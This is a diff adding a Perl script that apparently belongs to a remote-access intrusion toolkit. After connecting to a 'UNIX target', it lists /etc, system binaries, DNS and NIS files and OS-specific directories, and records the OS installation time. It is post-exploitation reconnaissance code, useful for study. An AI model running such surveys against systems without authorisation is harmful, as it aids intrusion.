@@ -1,0 +1,86 @@
+#!/usr/bin/env perl
+#
+# 20130416 - This portion of autonewdone implements all of the dir listings
+# that need to be performed when first connecting to a UNIX target.
+#
+$VER="3.0.0.2";
+$ext = $$ ;			# limits likelihood of concurrent autodone's colliding
+				# BUT: still possible.
+				# not too likely to happen.
+
+$| = 1;
+myinit() ;
+
+sub dodirlist() {
+  doit("-ls -ct /etc > L:$opdown/ls_etc-ct.$nopen_rhostname");
+  if (open(ETCDIR,"< $opdown/ls_etc-ct.$nopen_rhostname")) {
+    my ($mon,$d,$h,$m,$year);
+    while (chomp($line = <ETCDIR>)) {
+      $line =~ s/\r//g ; # Get rid of ^M's
+      #dbg("in autonewdone dodirlist, line=$line=");
+      next unless (($mon,$d,$h,$m,,$year) = $line =~
+        /(\S{3})\s+(\d+)\s+(\d+):(\d+) (\d+) \//) ;
+      $d += 100;
+      $d = substr($d,1);
+      print HOSTINFO "OS Installation Time: $year-$mons{$mon}-$d $h:$m:00\n";
+      last;
+    }
+    close(ETCDIR);
+  }
+  else {
+    myalert("Can't open $opdown/ls_etc-ct.$nopen_rhostname! $!");
+  }
+
+  open(CMDOUT,">$opdown/script.ids$nopen_rhostname");
+  logdoit("-ls /bin /usr /usr/sbin /usr/local");
+  logdoit("-ls /var/yp",
+          "-ls /etc/bind* /etc/named* /etc/*ndc* /usr/local/etc/named*",
+          "-ls /var/named* /var/log/named* /var/run/named*",
+         );
+         
+  if ($solaristarget) {
+    logdoit("-ls -R /var/crash");
+    
+  } elsif($darwintarget) {
+    logdoit("-ls /private/etc");
+    
+  } else {
+    logdoit("-ls /etc /usr/local/etc");
+  }
+  
+  close(CMDOUT);
+  return 1;
+}
+
+dodirlist ();
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $calledviarequire = 0;
+  if ($willautoport and $socket) {
+    progprint("$prog called -gs newdone.dirlist @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }
+    require $autoutils;
+    $prog = "-gs newdone.dirlist";
+    $vertext = "$prog version $VER\n" ;
+    mydie("No user servicable parts inside.\n".
+	  "(I.e., noclient calls $prog, not you.)\n".
+	  "$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			      -e $nopen_mylog);
+  }
+
+  # Setting $autodone allows any mydo() called functions to know
+  # we are in this mode to populate $opdir/latewarnings*
+  $autodone=1;
+
+  # If $socket is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $socket = pilotstart(quiet) unless $socket;
+}#myinit
